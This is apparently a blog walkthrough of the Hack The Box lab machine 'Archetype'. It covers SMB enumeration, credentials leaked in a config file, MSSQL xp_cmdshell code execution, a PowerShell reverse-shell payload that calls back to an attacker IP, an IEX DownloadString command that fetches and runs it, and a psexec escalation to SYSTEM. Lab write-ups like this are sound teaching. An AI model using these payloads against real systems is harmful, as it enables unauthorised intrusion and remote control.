---
title: Archetype
date: 2021-03-15
hero: /images/content/posts/hack-the-box/archetype.png
categories:
  - hack-the-box
tags:
  - windows
  - powershell
  - mssql
---

This was a good box to get back in the swing of things, it gave me a good challenge, and reminded me of how difficult it can be to google for Windows enum tools. Besides that, it was a good reminder of how to interact with SMB and showed me a new place to look for user command history in Windows.

## Tools

- nmap
- netcat
- mssqlclient

## Recon

First, we need to check the open ports on this machine. We can use `nmap` to do check for these. I use the command `nmap -sV -sS -p- archetype.htb -oA nmap/archetype`, and we got quite a few ports open!

```
# Nmap 7.91 scan initiated Mon Mar 15 15:22:53 2021 as: nmap -sV -sS -p- archetype.htb -oA nmap/archetype
Nmap scan report for archetype.htb (10.10.10.27)
Host is up (0.035s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 15 15:25:30 2021 -- 1 IP address (1 host up) scanned in 156.36 seconds
```

We have quite a few consecutive ports open in the range `49664-49669`. There is also a server open on port 445 and what looks like some API endpoints open on `5985` and `47001`. For now let's check to see if there is anything we can see through anonymous login via `smb`. What is `smb`? Well, `smb` or Server Message Block is used for remote communication and enables users to view, share, and edit files. This means that if for some reason anonymous login is allowed, we might be able to see some files, if we are lucky maybe even sensitive ones.

## Foothold

To check out if `smb` allows for anonymous access I am going to use the `smbclient`, here it is `smbclient -N -L \\archetype.htb\`. Let's break it down, `-N` means no-password, this will not ask us for a password, next we have `-L`, this gets the list of shares there are available on the host. Now let's run it.

```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

Looks like this machine has four shares, but the shares `ADMIN$`, `C$`, and `IPC$` are all default shares. The one we are interested in is `backups`. To examine this share use the command `smbclient -N \\archetype.htb\backups`, notice that now we are not listing the shares and we specified the share at the end of the path. Once we are connected use the `ls` command to list the files in the share. Interestingly enough there is a file called `prod.dstConfig`, config files are good they can tell us how the machines were set up, and sometimes can leak credentials ;).

```
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

		10328063 blocks of size 4096. 8257544 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
smb: \> exit
```

Now that we have the file let's take a look at what is inside.

```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

Would ya look at that, there are some account credentials for what looks like the `sql` server running on port `1433`. We can connect to the `sql` server using the client included with [Impacket](https://github.com/SecureAuthCorp/impacket). I cloned this repo into a directory called `gitclones` in my home directory. The command I used to connect is:

```
python ~/gitclones/impacket/examples/mssqlclient.py -port 1433 ARCHETYPE/sql_svc:M3g4c0rp123@archetype.htb -windows-auth
```

This specifies the port as `1433`, although I believe this is the default port, and then includes the domain, username, password, and ip. Finally the `-windows-auth` flag specifies that we want to use windows authentication.

## User

If we run the command `help` it will tell us some commands we have at our disposal.

```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

Well look at that, the command `xp_cmdshell` might let us execute code on the machine if we have the correct permissions. Let's enable it and see if we do.

```
SQL> enable_xp_cmdshell
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell powershell whoami
output

--------------------------------------------------------------------------------

archetype\sql_svc

NULL

SQL>
```

Well we can execute commands, let's try and get a reverse shell up and running. copy the following code into a file called `rv.ps1`. Replace the IP address with yours connected to HTB and the port can be anything you like.

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.202",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback+"# ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Then start a simple http server in the same directory using `python -m http.server`, this will host an http server on port 8000. Finally, start listening on for the reverse shell using the command `nc -lvnp [PORT]`. Then spawn it.

`xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.202:8000/rv.ps1\");"`

You should catch the shell on the terminal listening with netcat. From the shell we can navigate to the `user.txt` file. It is going to be in the `C:\Users\sql_svc\Desktop` directory.

## Root

Now let's check out the powershell history in `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`. Once we see that we get the following.

`net.exe use T: \Archetypeackups /user:administrator MEGACORP_4dm1n!!`

Looks like credentials to the administrators account! To access the account we can use `psexec.py` from Impacket's tools. Here is the command I used `python ~/gitclones/impacket/examples/psexec.py administrator@archetype.htb`. Once we authenticate:

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on archetype.htb.....
[*] Found writable share ADMIN$
[*] Uploading file CrWnXMou.exe
[*] Opening SVCManager on archetype.htb.....
[*] Creating service INdq on archetype.htb.....
[*] Starting service INdq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Again the `root.txt` file is on the Administrator's desktop.
